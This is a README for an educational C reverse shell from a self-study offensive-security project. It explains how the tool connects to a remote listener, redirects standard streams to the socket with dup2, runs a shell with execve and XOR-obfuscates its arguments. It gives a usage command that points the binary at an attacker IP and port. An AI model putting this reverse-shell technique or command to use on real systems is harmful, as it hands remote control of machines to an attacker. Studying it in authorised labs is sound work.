# Stealth C-Shell

> An educational reverse shell written in C to explore low-level system programming, POSIX networking APIs, process execution, and UNIX file descriptor manipulation.

---

## 📖 About

**Stealth C-Shell** is an educational C project focused on understanding how a basic reverse shell operates at a low level.

The project explores several fundamental UNIX and POSIX concepts, including:

* TCP socket communication
* Process execution
* File descriptor manipulation
* Standard stream redirection
* Basic memory obfuscation techniques

This project was developed as part of my self-study in **offensive security** and **system architecture**, with a focus on understanding what happens under the hood rather than relying on high-level tools.

---

## ⚠️ Disclaimer

This project is intended **strictly for educational purposes**.

It was created to study low-level system programming and understand the mechanisms behind automated security tools.

> **Do not use this project against systems or networks without explicit authorization.**

Only use it in environments where you have permission to perform security testing.

---

## 🚀 Features

### POSIX Sockets

Establishes a raw TCP connection using standard POSIX networking functions:

* `socket()`
* `inet_pton()`
* `connect()`

### Process Execution

Demonstrates native process execution through the `execve()` system call.

### I/O Redirection

Redirects the standard UNIX streams:

* `stdin`
* `stdout`
* `stderr`

to the network socket using `dup2()`.

### Memory Manipulation

Includes a basic static XOR implementation applied to command-line arguments to demonstrate fundamental memory obfuscation concepts.

---

## 🛠️ Technologies

| Technology                | Purpose                          |
| ------------------------- | -------------------------------- |
| **C**                     | Core implementation              |
| **POSIX API**             | System and networking interfaces |
| **TCP/IP**                | Network communication            |
| **UNIX File Descriptors** | Standard stream manipulation     |
| **Make**                  | Project compilation              |

---

## 🔧 Makefile

The project includes a `Makefile` to simplify compilation and cleanup.

### Available Commands

```bash
make
```

Compile the project.

```bash
make all
```

Compile all project files.

```bash
make clean
```

Remove object files.

```bash
make fclean
```

Remove object files and the compiled executable.

```bash
make re
```

Clean the project completely and rebuild it from scratch.

---

## ▶️ Usage

The resulting binary can be executed with an IP address and listening port:

```bash
./client <attacker_ip> <port>
```

### Example

```bash
./client 127.0.0.1 4444
```

Use this only within an authorized test environment.

---

## 🧠 What I Learned

### POSIX API

Developed a better understanding of POSIX system interfaces, network byte order, and the mechanics of raw TCP socket communication.

### File Descriptors

Learned how UNIX file descriptors work and how they can be manipulated and inherited between processes.

### Process Execution

Explored how native processes are created and how `execve()` can be used to replace a process image.

### System Architecture

Built a clearer understanding of the relationship between high-level security tools and the underlying C/UNIX system calls they rely on.

---

## ⚠️ Known Issues & Future Improvements

### Memory Safety

The current XOR implementation modifies `argv` directly in memory.

While this works as a proof of concept, allocating a separate buffer would provide a cleaner approach to memory management.

### Encryption

The current implementation uses a single-byte XOR key for demonstration purposes.

This **is not cryptographically secure** and should not be considered real encryption or protection against modern static analysis.

---

## 📚 Project Goals

The main objectives of this project are to:

* Understand low-level TCP communication.
* Practice POSIX system calls.
* Manipulate UNIX file descriptors.
* Explore process execution with `execve()`.
* Understand how standard streams can be redirected.
* Experiment with basic memory obfuscation techniques.
* Strengthen C programming and system-level debugging skills.

---

## 🏫 42 School

This project follows the **42 School approach** of learning through experimentation, implementation, debugging, and understanding the underlying mechanisms rather than relying solely on abstractions.

The goal is not simply to make the program work, but to understand **why it works**.

---

## 📌 Status

**Educational / Proof of Concept**

This project is intended for learning and experimentation in controlled, authorized environments.

